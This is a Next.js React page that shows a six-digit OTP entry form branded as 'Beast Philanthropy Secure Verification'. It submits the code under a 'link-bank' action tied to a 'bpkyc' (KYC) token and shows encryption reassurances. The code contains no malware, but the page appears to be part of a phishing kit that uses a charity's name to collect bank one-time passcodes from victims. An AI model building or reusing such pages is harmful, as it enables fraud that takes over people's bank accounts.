"use client";
import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";

export default function OtpPage() {
  const router = useRouter();
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const otpRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const token = localStorage.getItem("bpkyc_token");
    if (!token) router.push("/login");
  }, [router]);

  const handleOtpChange = (idx: number, val: string) => {
    if (!/^\d*$/.test(val)) return;
    const next = [...otp];
    next[idx] = val.slice(-1);
    setOtp(next);
    if (val && idx < 5) otpRefs.current[idx + 1]?.focus();
  };

  const handleOtpKeyDown = (idx: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[idx] && idx > 0) {
      otpRefs.current[idx - 1]?.focus();
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const code = otp.join("");
    if (code.length < 6) {
      setError("Please enter all 6 digits.");
      return;
    }
    setError("");
    setIsLoading(true);

    try {
      const token = localStorage.getItem("bpkyc_token");
      const res = await fetch("/api/user/actions", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          action: "link-bank",
          step: "otp",
          otp: code,
        }),
      });

      if (res.ok) {
        setTimeout(() => router.push("/dashboard?success=bank"), 500);
      } else {
        const data = await res.json();
        setError(data.error || "Verification failed. Please try again.");
      }
    } catch {
      setError("Network error. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div style={{
      minHeight: "100vh",
      background: "linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      padding: "20px",
      fontFamily: "Montserrat, sans-serif",
    }}>
      <style>{`
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(24px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        .otp-input {
          width: 52px;
          height: 64px;
          border-radius: 12px;
          border: 2px solid rgba(255,255,255,0.12);
          background: rgba(255,255,255,0.06);
          color: #fff;
          font-size: 1.6rem;
          font-weight: 800;
          text-align: center;
          outline: none;
          transition: border-color 0.2s, background 0.2s;
          backdrop-filter: blur(4px);
          font-family: Montserrat, monospace;
          caret-color: transparent;
        }
        .otp-input:focus {
          border-color: #f9c74f;
          background: rgba(249,199,79,0.08);
        }
        .step-btn {
          width: 100%;
          padding: 16px;
          border-radius: 50px;
          border: none;
          background: linear-gradient(135deg, #f9c74f, #f3722c);
          color: #1a1a1a;
          font-family: Montserrat, sans-serif;
          font-weight: 900;
          font-size: 0.9rem;
          text-transform: uppercase;
          letter-spacing: 0.08em;
          cursor: pointer;
          transition: opacity 0.2s, transform 0.2s;
        }
        .step-btn:hover { opacity: 0.9; transform: translateY(-1px); }
        .step-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
      `}</style>

      <div style={{
        background: "rgba(255,255,255,0.04)",
        backdropFilter: "blur(20px)",
        border: "1px solid rgba(255,255,255,0.1)",
        borderRadius: "24px",
        padding: "48px 40px",
        width: "100%",
        maxWidth: "420px",
        boxShadow: "0 32px 80px rgba(0,0,0,0.5)",
        animation: "fadeUp 0.4s ease-out",
        position: "relative",
      }}>
        {/* Logo */}
        <div style={{ textAlign: "center", marginBottom: "32px" }}>
          <div style={{ fontWeight: 900, fontSize: "1.2rem", letterSpacing: "-0.02em", color: "#fff", textTransform: "uppercase", marginBottom: "6px" }}>
            Beast <span style={{ color: "#f9c74f" }}>Philanthropy</span>
          </div>
          <p style={{ fontSize: "0.75rem", color: "rgba(255,255,255,0.4)", textTransform: "uppercase", letterSpacing: "0.1em" }}>Secure Verification</p>
        </div>

        {/* OTP Step */}
        <form onSubmit={handleOtpSubmit} style={{ animation: "fadeUp 0.3s ease-out" }}>
          <div style={{ textAlign: "center", marginBottom: "28px" }}>
            <div style={{ fontSize: "2.5rem", marginBottom: "12px" }}>📱</div>
            <h1 style={{ fontSize: "1.4rem", fontWeight: 900, color: "#fff", marginBottom: "8px", textTransform: "uppercase" }}>Enter OTP</h1>
            <p style={{ fontSize: "0.85rem", color: "rgba(255,255,255,0.5)", lineHeight: 1.5 }}>
              Enter the 6-digit code sent to your registered phone or email.
            </p>
          </div>

          <div style={{ display: "flex", gap: "8px", justifyContent: "center", marginBottom: "28px" }}>
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={el => { otpRefs.current[i] = el; }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={e => handleOtpChange(i, e.target.value)}
                onKeyDown={e => handleOtpKeyDown(i, e)}
                className="otp-input"
                autoFocus={i === 0}
              />
            ))}
          </div>

          {error && (
            <div style={{ background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.3)", borderRadius: "10px", padding: "10px 14px", marginBottom: "16px", fontSize: "0.8rem", color: "#fca5a5", textAlign: "center" }}>
              {error}
            </div>
          )}

          <button type="submit" className="step-btn" disabled={isLoading}>
            {isLoading ? (
              <span style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px" }}>
                <span style={{ width: "16px", height: "16px", border: "2px solid rgba(0,0,0,0.3)", borderTopColor: "#1a1a1a", borderRadius: "50%", display: "inline-block", animation: "spin 0.8s linear infinite" }} />
                Submitting...
              </span>
            ) : "VERIFY"}
          </button>
        </form>

        {/* Security Footer */}
        <div style={{ marginTop: "32px", paddingTop: "20px", borderTop: "1px solid rgba(255,255,255,0.06)", display: "flex", alignItems: "center", justifyContent: "center", gap: "6px" }}>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.3)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
          </svg>
          <span style={{ fontSize: "0.7rem", color: "rgba(255,255,255,0.25)", fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.08em" }}>
            256-bit Encrypted · Secure Verification
          </span>
        </div>
      </div>
    </div>
  );
}
